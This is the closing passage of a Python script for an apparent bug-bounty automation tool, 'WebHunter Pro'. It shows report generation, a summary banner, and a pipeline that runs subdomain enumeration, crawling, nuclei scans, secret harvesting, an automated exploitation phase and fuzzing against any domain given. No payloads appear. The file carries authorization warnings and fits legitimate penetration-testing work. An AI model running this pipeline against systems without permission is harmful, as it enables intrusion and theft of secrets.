    <div class="stat crit"><div class="num red">{sev('critical')}</div><div class="lbl">Critical</div></div>
    <div class="stat high"><div class="num org">{sev('high')}</div><div class="lbl">High</div></div>
    <div class="stat med"><div class="num yel">{sev('medium')}</div><div class="lbl">Medium</div></div>
    <div class="stat info"><div class="num">{len(r.vulnerabilities)}</div><div class="lbl">Total Vulns</div></div>
  </div>

  <div class="section">
    <div class="sec-title">Vulnerability Findings <span class="count-badge">{len(r.vulnerabilities)}</span></div>
    {"<div class='no-data'>✓ NO VULNERABILITIES DETECTED</div>" if not r.vulnerabilities else f"""
    <table>
      <thead><tr><th>Severity</th><th>Vulnerability</th><th>URL / Location</th><th>Tool</th><th>Detail</th></tr></thead>
      <tbody>{vuln_rows}</tbody>
    </table>"""}
  </div>

  {"" if not r.secrets_found else f"""
  <div class="section">
    <div class="sec-title">Secrets & Sensitive Data <span class="count-badge">{len(r.secrets_found)}</span></div>
    <table>
      <thead><tr><th>Type</th><th>Location</th><th>Evidence</th></tr></thead>
      <tbody>{secret_rows}</tbody>
    </table>
  </div>"""}

  <div class="section">
    <div class="sec-title">Discovered Subdomains <span class="count-badge">{len(r.subdomains)}</span></div>
    <table>
      <thead><tr><th>Subdomain</th></tr></thead>
      <tbody>{"".join(f"<tr><td class='mono'>{s}</td></tr>" for s in sorted(r.subdomains)[:40])}
      {"<tr><td class='dim'>... and " + str(len(r.subdomains)-40) + " more</td></tr>" if len(r.subdomains) > 40 else ""}
      </tbody>
    </table>
  </div>
</div>

<footer>WEBHUNTER PRO v2.0 &nbsp;|&nbsp; FOR AUTHORIZED PENETRATION TESTING ONLY &nbsp;|&nbsp; {datetime.now().year}</footer>
</body>
</html>"""
        with open(f"{self.output_dir}/report.html", 'w') as f:
            f.write(html)
        self.log.success(f"HTML report → {self.output_dir}/report.html")

    def _print_summary(self):
        r = self.results
        sev = lambda s: sum(1 for v in r.vulnerabilities if v['severity'] == s)
        vuln_by_type = {}
        for v in r.vulnerabilities:
            vuln_by_type[v['type']] = vuln_by_type.get(v['type'], 0) + 1

        print(f"""
{C.CYAN}{C.BOLD}
╔══════════════════════════════════════════════════════════════════╗
║               WEBHUNTER PRO v2.0 — SCAN COMPLETE                ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  Target       : {r.domain:<48}║
║  Duration     : {str(datetime.now() - r.start_time).split('.')[0]:<48}║
║                                                                  ║
╠══════════════════════════════════════════════════════════════════╣
║  Subdomains   : {len(r.subdomains):<48}║
║  Alive Hosts  : {len(r.alive_hosts):<48}║
║  Crawled URLs : {len(r.crawled_urls):<48}║
║  Endpoints    : {len(r.endpoints):<48}║
║  JS Files     : {len(r.js_files):<48}║
║  Secrets      : {len(r.secrets_found):<48}║
╠══════════════════════════════════════════════════════════════════╣
║{C.RED}  CRITICAL     : {sev('critical'):<48}{C.CYAN}║
║{C.ORANGE}  HIGH         : {sev('high'):<48}{C.CYAN}║
║{C.YELLOW}  MEDIUM       : {sev('medium'):<48}{C.CYAN}║
║  TOTAL VULNS  : {len(r.vulnerabilities):<48}║
╠══════════════════════════════════════════════════════════════════╣""")
        for vtype, count in list(vuln_by_type.items())[:8]:
            print(f"║{C.ORANGE}  [{count:>3}x]{C.RESET}{C.CYAN} {vtype:<57}║")
        print(f"""╠══════════════════════════════════════════════════════════════╣
║{C.GREEN}  Output: {r.domain.replace('.','_')}_scan/{' ':<43}{C.CYAN}║
║{C.DIM}  report.html · report.json · report.md{' '*26}{C.CYAN}║
╚══════════════════════════════════════════════════════════════╝{C.RESET}
""")

# ─── Main Engine ───────────────────────────────────────────────────────────────
class WebHunterPro:
    def __init__(self, args):
        self.args = args
        self.domain = args.domain.lower().strip().replace('https://','').replace('http://','').rstrip('/')
        self.output_dir = args.output or f"{self.domain.replace('.','_')}_scan"
        Path(self.output_dir).mkdir(exist_ok=True)
        self.log = Logger(f"{self.output_dir}/webhunter.log")
        self.results = ScanResults(self.domain)

    def run(self):
        banner()
        print(f"  {C.CYAN}Target   :{C.RESET} {C.BOLD}{self.domain}{C.RESET}")
        print(f"  {C.CYAN}Output   :{C.RESET} {self.output_dir}/")
        print(f"  {C.CYAN}Threads  :{C.RESET} {self.args.threads}\n")

        available, missing = ToolChecker.check_all(self.log)

        # Phase 1 — Subdomain Enum
        if not self.args.skip_enum:
            SubdomainEnumerator(self.domain, self.output_dir, self.log, self.results, available).run()
        else:
            self._load_file(f"{self.output_dir}/subdomains.txt", 'subdomains')

        # Phase 2 — Alive Check
        if not self.args.skip_alive:
            AliveChecker(self.results.subdomains or [self.domain], self.output_dir, self.log, self.results, available).run()
        else:
            self._load_file(f"{self.output_dir}/alive_hosts.txt", 'alive_hosts')

        # Phase 3 — Crawl
        if not self.args.skip_crawl:
            URLCrawler(self.results.alive_hosts or [self.domain], self.domain, self.output_dir, self.log, self.results, available).run()

        # Phase 4 — Nuclei
        if not self.args.skip_nuclei:
            NucleiScanner(self.results.alive_hosts or [self.domain], self.output_dir, self.log, self.results, available).run()

        # Phase 5 — Secrets
        if not self.args.skip_secrets:
            SecretScanner(self.results, self.output_dir, self.log, available).run()

        # Phase 6 — Full Exploitation
        if not self.args.skip_exploit:
            FullArsenalExploiter(self.results, self.output_dir, self.log, available, self.args).run()

        # Phase 7 — Directory Fuzzing
        if not self.args.skip_fuzz:
            DirectoryFuzzer(self.results.alive_hosts, self.output_dir, self.log, self.results, available).run()

        # Phase 8 — Report
        ReportGenerator(self.results, self.output_dir, self.log).generate()

    def _load_file(self, path, attr):
        if os.path.exists(path):
            with open(path) as f:
                setattr(self.results, attr, [l.strip() for l in f if l.strip()])

# ─── CLI ───────────────────────────────────────────────────────────────────────
def parse_args():
    parser = argparse.ArgumentParser(
        prog='webhunter',
        description='WebHunter Pro v2.0 — Full Arsenal Bug Bounty Automation',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""{C.CYAN}Examples:{C.RESET}
  python3 WebHunter.py -d example.com
  python3 WebHunter.py -d example.com --skip-fuzz
  python3 WebHunter.py -d example.com --skip-enum --skip-alive
  python3 WebHunter.py -d example.com --threads 100 --output myreport

{C.RED}⚠  Authorized targets only. Unauthorized testing is illegal.{C.RESET}"""
    )
    parser.add_argument('-d', '--domain', required=True, help='Target domain (e.g., example.com)')
    parser.add_argument('--threads', type=int, default=50, help='Thread count (default: 50)')
    parser.add_argument('--output', help='Custom output directory name')
    parser.add_argument('--skip-enum',    action='store_true', help='Skip subdomain enumeration')
    parser.add_argument('--skip-alive',   action='store_true', help='Skip alive host detection')
    parser.add_argument('--skip-crawl',   action='store_true', help='Skip URL crawling')
    parser.add_argument('--skip-nuclei',  action='store_true', help='Skip nuclei scanning')
    parser.add_argument('--skip-secrets', action='store_true', help='Skip secret/JS scanning')
    parser.add_argument('--skip-exploit', action='store_true', help='Skip exploitation')
    parser.add_argument('--skip-fuzz',    action='store_true', help='Skip directory fuzzing')
    return parser.parse_args()

if __name__ == '__main__':
    args = parse_args()
    print(f"\n{C.RED}  ⚠  LEGAL: Use on authorized targets only. Unauthorized testing is illegal.{C.RESET}\n")
    time.sleep(1)
    WebHunterPro(args).run()